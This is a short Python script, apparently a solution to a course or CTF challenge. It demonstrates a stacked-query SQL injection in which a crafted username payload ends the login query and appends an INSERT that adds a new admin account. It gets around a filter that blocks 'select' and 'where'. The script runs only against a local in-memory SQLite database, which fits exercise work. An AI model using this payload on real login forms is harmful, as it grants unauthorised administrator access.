#!/usr/bin/env python3
"""
Challenge 13 - stacked-query SQL injection that creates a new admin.

The decompiled code runs a SELECT through executeUpdate() (which is meant for
INSERT/UPDATE/DELETE), and that lets you run several statements separated by ';'. The
filters block "select" and "where" but not "insert", so I end the first statement and
add my own INSERT.

Payload (username field):
    x'; INSERT INTO admins (username, password, name, role)
        VALUES ('tester@app.com', 'hash', 'tester', 'admin');--

The instructor's db isn't included, so this uses Python's executescript() on a local
copy to act like Java's multi-statement executeUpdate().
"""
import sqlite3

PAYLOAD = ("x'; INSERT INTO admins (username, password, name, role) "
           "VALUES ('tester@app.com', 'hash', 'tester', 'admin');--")


def build_db() -> sqlite3.Connection:
    con = sqlite3.connect(":memory:")
    con.executescript(
        """
        CREATE TABLE users  (id INTEGER PRIMARY KEY, username TEXT, password TEXT, name TEXT, role TEXT);
        CREATE TABLE admins (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT, name TEXT, role TEXT);
        INSERT INTO users  VALUES (1,'alice','x','alice','user');
        INSERT INTO admins (username,password,name,role) VALUES ('victor','x','victor','admin');
        """
    )
    return con


def main() -> None:
    con = build_db()
    query = (f"SELECT * FROM users WHERE username='{PAYLOAD}' AND password=('md5hash')")
    print("Executed (as a multi-statement batch):\n ", query, "\n")
    con.executescript(query)  # stands in for executeUpdate() running stacked statements
    rows = con.execute("SELECT id,username,name,role FROM admins WHERE name='tester'").fetchall()
    print("admins table now has the injected tester:", rows)


if __name__ == "__main__":
    main()
